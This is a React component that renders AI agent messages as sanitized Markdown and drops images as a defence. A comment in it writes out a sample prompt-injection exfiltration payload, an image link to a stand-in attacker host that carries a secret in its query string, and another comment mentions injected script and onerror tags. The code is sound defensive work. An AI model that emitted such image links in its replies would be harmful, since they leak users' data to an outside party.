"use client";

import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import rehypeSanitize from "rehype-sanitize";

// Links always open in a new tab and can never leak the opener. react-markdown
// does not render raw HTML by default, and rehype-sanitize is a second guard, so
// an injected <img onerror> or <script> in a model reply renders as inert text.
const COMPONENTS: Components = {
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  ),
};

// Images are dropped entirely (FX-04 / C6): a model reply is untrusted, and a
// remote `![](https://attacker/?d=<secret>)` would auto-fetch on render — a
// data-exfiltration channel via prompt injection. `rehype-sanitize` already
// strips javascript:/data: URLs on links; dropping <img> closes the last one.
const DISALLOWED = ["img"];

/**
 * Renders an agent message as sanitized Markdown (GFM: tables, lists, autolinks).
 * `panel` = the docked ChatPanel (light, 13px); `page` = the full Agent page
 * (currently a dark surface — inverted colors via `.prose-chat-page`). Styles
 * live in globals.css `.prose-chat`. Tolerates unclosed syntax while streaming.
 */
export function Markdown({
  children,
  variant = "panel",
}: {
  children: string;
  variant?: "panel" | "page";
}) {
  return (
    <div className={variant === "page" ? "prose-chat prose-chat-page" : "prose-chat"}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeSanitize]}
        components={COMPONENTS}
        disallowedElements={DISALLOWED}
        unwrapDisallowed
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
